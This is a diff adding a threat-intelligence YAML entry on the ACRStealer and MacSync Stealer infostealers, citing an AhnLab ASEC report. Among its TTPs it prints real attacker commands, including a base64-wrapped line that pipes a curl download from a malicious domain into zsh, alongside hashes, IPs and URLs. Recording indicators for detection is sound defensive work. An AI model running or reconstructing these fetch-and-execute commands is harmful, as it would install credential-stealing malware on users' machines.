@@ -1,0 +1,46 @@
+description: Infostealer malware distribution and execution through SEO poisoning,
+  DLL sideloading, and macOS-specific techniques including osascript and Bash scripts.
+malware_families:
+- ACRStealer
+- MacSync Stealer
+TTPs:
+  processes:
+  - powershell.exe
+  - zsh
+  commandline:
+  - 'echo GitHub-AppInstaller: https://dl.github[.]com/drive-file-stream/GitHubApplicationSetup.dmg
+    && echo ZWNobyAnSW5zdGFsbGluZyBwYWNrYWdlcyBwbGVhc2Ugd2FpdC4uLicgJiYgY3VybCAta2ZzU0wgaHR0cDovL3Nlc3RyYWluaW5n[.]com/curl/0ba44d64963765fb64db6a8f2f80deeb8735b24ab988eff22668a38be81eb4be|base64
+    -D|zsh'
+  - echo Installing packages please wait... && curl -kfsSL http://sestraining[.]com/curl/0ba44d64963765fb64db6a8f2f80deeb8735b24ab988eff22668a38be81eb4be|zsh
+  powershell: []
+  scripting_engine:
+  - Bash
+  - osascript
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - curl -kfsSL http://sestraining[.]com/curl/0ba44d64963765fb64db6a8f2f80deeb8735b24ab988eff22668a38be81eb4be|zsh
+  - curl -kfsSL http://sestraining[.]com/curl/0ba44d64963765fb64db6a8f2f80deeb8735b24ab988eff22668a38be81eb4be|zsh
+  file_activity:
+  - /tmp/osalogging.zip
+  persistence: []
+  process_relations: []
+IOCs:
+  hashes:
+  - 7a5c704e85df3dec08c9ab17857c4ac13337c23f
+  - 73600d113646a95d2e459dd940c18e1e
+  - 74e17b926dc6cc5ab247aa0e059916c1
+  - 4aab18983ab8c00f3c619b75033ce548
+  ip_addresses:
+  - 146.103.102[.]11
+  - 94.103.95[.]97
+  domains:
+  - sestraining.com
+  urls:
+  - https://dl.github[.]com/drive-file-stream/GitHubApplicationSetup.dmg
+  - http://sestraining[.]com/curl/0ba44d64963765fb64db6a8f2f80deeb8735b24ab988eff22668a38be81eb4be
+authors:
+- AhnLab Security Intelligence Center (ASEC)
+reference: https://asec.ahnlab.com/en/92646
+date_of_publication: February 18, 2026
+file_creation_date: March 01, 2026
